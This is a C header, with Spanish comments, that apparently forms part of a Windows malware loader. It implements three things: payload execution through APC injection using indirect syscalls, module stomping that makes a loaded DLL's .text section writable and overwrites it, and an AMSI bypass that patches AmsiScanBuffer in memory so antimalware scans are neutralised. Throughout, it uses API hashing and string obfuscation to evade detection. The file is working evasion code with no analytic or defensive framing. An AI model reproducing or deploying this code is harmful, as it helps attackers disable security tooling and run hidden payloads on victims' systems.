#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "api_hashes.h"
#include "syscalls.h"

// =============================================================================
// ESTRUCTURAS
// =============================================================================

typedef struct _STOMP_CONTEXT {
    PVOID BaseAddress;
    SIZE_T RegionSize;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_SECTION_HEADER TextSection;
    PVOID OriginalText;
} STOMP_CONTEXT, *PSTOMP_CONTEXT;

typedef struct _API_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtQueueApcThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
} API_TABLE;

// Declaraciones globales compartidas
extern PVOID g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// THREADLESS EXECUTION (APC INJECTION)
// =============================================================================

static void ThreadlessExecute(PVOID pPayload) {
    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != GetCurrentThreadId()) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                    if (hThread) {
                        InvokeSyscall(g_ApiTable.NtQueueApcThread.ssn, g_SyscallGadget, hThread, pPayload, NULL, NULL, NULL);
                        CloseHandle(hThread);
                        break;
                    }
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }
}

// =============================================================================
// MODULE STOMPING ROBUSTO
// =============================================================================

static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONTEXT ctx) {
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
    LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
    HMODULE hModule = pLoadLibraryW(targetDll);
    if (!hModule) return FALSE;
    
    ctx->BaseAddress = (PVOID)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    ctx->NtHeaders = pNt;
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, STOBFS_A(".text"), 5) == 0) {
            ctx->TextSection = &pSection[i];
            ctx->RegionSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    
    if (!ctx->TextSection || payloadSize > ctx->RegionSize) return FALSE;
    
    PVOID pText = (PBYTE)ctx->BaseAddress + ctx->TextSection->VirtualAddress;
    ULONG oldProtect = 0;
    SIZE_T regionSize = ctx->RegionSize;
    
    InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pText, &regionSize, PAGE_READWRITE, &oldProtect);
    memset(pText, 0x90, ctx->RegionSize); 
    
    return TRUE;
}

// =============================================================================
// AMSI BYPASS ROBUSTO
// =============================================================================

static BOOL BypassAMSI_DataOnlyRobust() {
    LDR_DATA_TABLE_ENTRY_PTR *pMod = NULL;
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    PVOID hAmsi = NULL;
    
    while (pEntry != pHead) {
        pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'a') {
            hAmsi = pMod->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }
    
    if (!hAmsi) {
        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
        hAmsi = pLoadLibraryW(STOBFS_W(L"amsi.dll"));
    }
    if (!hAmsi) return FALSE;
    
    PVOID pAmsiScanBuffer = ResolveApiByHash(hAmsi, HASH_AmsiScanBuffer);
    if (pAmsiScanBuffer) {
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
        ULONG oldProtect = 0;
        SIZE_T patchSize = sizeof(patch);
        PVOID pPatchAddr = pAmsiScanBuffer;
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pPatchAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pPatchAddr, &patchSize, oldProtect, &oldProtect);
        return TRUE;
    }
    return FALSE;
}

#endif
